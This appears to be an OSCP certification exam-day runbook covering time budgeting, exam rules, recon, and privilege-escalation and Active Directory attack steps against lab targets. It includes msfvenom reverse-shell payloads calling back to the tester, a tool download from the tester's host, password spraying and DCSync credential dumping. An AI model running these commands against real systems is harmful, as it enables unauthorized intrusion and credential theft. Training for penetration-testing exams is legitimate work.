# 🎯 OSCP EXAM-DAY RUNBOOK

> Follow this top to bottom. Every command is copy-paste ready.
> Scripts live in `~/Desktop/OSCP-Notes-and-Environment/OSCP-Exam/scripts/` (run as `scripts/<name>.sh`); invoke reconx via `scripts/rx.sh`.
> **`cd ~/Desktop/OSCP-Notes-and-Environment/OSCP-Exam` first.**

---

## 0. SCORING & TIME BUDGET

- **Pass = 70 / 100.** Report due **24h after** exam window ends.
- Layout: **AD set = 40 pts** (DC01 + MS01 + MS02, chained — treat as one objective).
  **3 standalones = 20 pts each** (usually 10 local.txt + 10 proof.txt).
- **Suggested clock (23h45m):**
  | Block | Time | Goal |
  |-------|------|------|
  | Recon ALL 6 | 0:00–0:45 | fire recon at everything, then triage |
  | AD set | 0:45–6:00 | 40 pts — do this while fresh |
  | Standalone #1 | 6:00–9:00 | +20 → likely at pass |
  | Standalone #2 | 9:00–12:00 | +20 |
  | Standalone #3 | 12:00–15:00 | cushion |
  | **SLEEP** | 15:00–20:00 | brain > brute force |
  | Cleanup / re-attempts | 20:00–22:00 | grab missing proofs |
  | Report polish | last 2h + next day | screenshots → PDF |
- **Once you hit 70, STOP hunting and START screenshotting.** Points you can't prove don't count.

---

## ⛔ GOLDEN RULES (don't fail on a technicality)

- **Metasploit / Meterpreter: ONE standalone box only. NEVER on the AD set.**
  `msfvenom` payloads + multi/handler are unlimited; the auto-exploit restriction is what to watch.
- **No automated exploitation tools** — no sqlmap `--os-shell`, no autopwn. `reconx`/AutoRecon recon is fine; keep reconx in enum mode, never let it fire an exploit chain.
- **Screenshot EVERY flag** with `type %COMPUTERNAME%` / `hostname && id` + `ipconfig`/`ip a` in the same frame.
- **Log everything:** run under `logsession.sh` so you have a full transcript if a screenshot is lost.
- Re-read the official exam guide the morning of — OffSec tweaks rules.

---

## 1. EXAM START (first 10 minutes)

```bash
cd ~/Desktop/OSCP-Notes-and-Environment/OSCP-Exam

# health-check the toolbox (fix any ✗ before you need it)
~/Desktop/OSCP-Notes-and-Environment/pakcyberbots_OSCP_environment/oscp-doctor

# verify staged payloads are intact
( cd serve && sha256sum -c MANIFEST.sha256 )   # single top-level manifest (./subdir/ paths)

# start a logged shell (transcript -> logs/)
scripts/logsession.sh exam

# load target IPs from the control-panel file (sets DC01_IP/MS01_IP/MS02_IP + T1_IP/T2_IP/T3_IP)
~/Desktop/OSCP-Notes-and-Environment/pakcyberbots_OSCP_environment/setup_pentest_env --oscp-exam exam-ips.txt

# tmux workspace: serve | listener | work panes
scripts/oscp-layout.sh exam        # attach later: tmux attach -t exam
```

Start your **serve** and **listener** panes so they're always ready:
```bash
scripts/serve.sh 80                 # serve the kit (from the right serve/ subdir)
scripts/listener.sh 443             # catch-all revshell listener
```

---

## 2. RECON — hit all 6 immediately, triage while they run

```bash
# reconx wrapper: rx <name> <target>  (output -> targets/<name>/scans/reconx/)
scripts/rx.sh dc01 $DC01_IP
scripts/rx.sh ms01 $MS01_IP
scripts/rx.sh ms02 $MS02_IP
scripts/rx.sh t1   $T1_IP
scripts/rx.sh t2   $T2_IP
scripts/rx.sh t3   $T3_IP
# no-dep fallback if reconx misbehaves:  scripts/recon.sh <ip> <name>
```
While scans run, open each `targets/<name>/notes.md` and start filling the Ports/Services table.
**Triage rule:** attack the box with the most obvious version-pinned service first.

---

## 3. STANDALONE LOOP (repeat per box)

```
1. Full nmap  ->  enumerate every service (web, smb, ftp, snmp...)
2. Web:  feroxbuster/ffuf + whatweb + nikto  ->  version -> searchsploit
3. SMB:  smbmap -H <ip> -u '' ; enum4linux-ng ; smbclient -N -L //<ip>/
4. Foothold: manual exploit (edit searchsploit PoC) OR creds -> service
5. Serve payload:  (kit already served) wget http://<YOU>/linux/linpeas.sh
6. PrivEsc: linpeas / winPEASx64 -> pick vector -> escalate
7. CAPTURE PROOFS (below) BEFORE moving on
```

### Foothold helpers
```bash
searchsploit <product> <version>
searchsploit -m <path>              # copy PoC into cwd, then READ & edit it
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$YOURIP LPORT=443 -f exe -o rev.exe
msfvenom -p linux/x64/shell_reverse_tcp  LHOST=$YOURIP LPORT=443 -f elf -o rev.elf
```

### PrivEsc quick refs (see cheatsheets/ for full)
- **Linux:** `sudo -l`, SUID (`find / -perm -4000 2>/dev/null`), cron, caps, kernel, PATH hijack, pspy64.
- **Windows:** `whoami /priv` → SeImpersonate → `PrintSpoofer64.exe`/`GodPotato-NET4.exe`; unquoted service paths; AlwaysInstallElevated; stored creds. winPEAS to enumerate.

---

## 4. ACTIVE DIRECTORY SET (40 pts — do it early)

```bash
# discover live hosts / build hosts file
scripts/gen-hosts.sh -r <CIDR>            # e.g. -r 10.10.x.0/24

# enum + kerberoast/asrep + crack (userlist enum built in)
scripts/ad-fastpath.sh -d <domain.local> -i $DC01_IP
#   add creds once you have them:   -u <user> -p '<pass>'   (or -H <nthash>)
#   -s spray  -b bloodhound  -c crack

# once you own creds/hashes -> dump + lateral
scripts/ad-secretsdump.sh -t $DC01_IP -d <domain.local> -u <user> -p '<pass>'   # DCSync on DC
scripts/ad-secretsdump.sh -t $MS01_IP -d . -H <local-nthash>                    # local SAM/LSA

# BloodHound for the path
scripts/bloodhound.sh start && scripts/bloodhound.sh pw    # UI http://localhost:8080
```
**AD flow:** foothold on one host → loot creds → BloodHound the path to DA → move laterally (evil-winrm / netexec / RDP) → collect proof on **all three** AD hosts.

```bash
evil-winrm -i <ip> -u <user> -p '<pass>'          # or -H <nthash>
netexec smb <ip> -u <user> -p '<pass>' --shares   # spray/validate creds across hosts
```

---

## 5. PROOF CAPTURE (do it the instant you get a flag)

```bash
# record each flag into report/proof-tally.csv
scripts/proof.sh -n <name> -i <ip> -t local -f <local.txt-contents>
scripts/proof.sh -n <name> -i <ip> -t proof -f <proof.txt-contents>
```
Screenshot in the SAME frame as the flag:
- Windows: `type C:\Users\...\local.txt & whoami & ipconfig`
- Linux:   `cat /home/*/local.txt; id; ip a`
- Root/SYSTEM proof: same, with `proof.txt` + privileged whoami.

Check your live score anytime:
```bash
cat report/proof-tally.csv
```

---

## 6. REPORTING

- Fill each `targets/<name>/notes.md` **as you go** — steps, commands, screenshots.
- Assemble into the report template, then:
```bash
scripts/md2report.sh report/OSCP-Report-Final.md -d   # -> PDF (+ .docx)
```
- Checklist before submit: every claimed box has **local + proof screenshots**, exact commands shown, IPs visible, repeatable steps. No proof screenshot = **no points**.

---

## 7. WHEN STUCK (timebox = 45 min per rabbit hole)

- Re-read the **full** nmap — did you skip a port/service?
- Try a different wordlist / recurse deeper on web.
- Default creds; creds you already looted reused elsewhere (`netexec` spray).
- Look at it as a human: what's the *intended* path? Version → exploit-db.
- Still stuck after 45 min → **switch boxes**, come back with fresh eyes.

## 8. END-OF-EXAM CHECKLIST

- [ ] `proof-tally.csv` shows ≥ 70 pts
- [ ] Every box: local.txt + proof.txt screenshots saved
- [ ] All notes.md filled with reproducible steps
- [ ] Report PDF generated and opens correctly
- [ ] Submitted before the report deadline
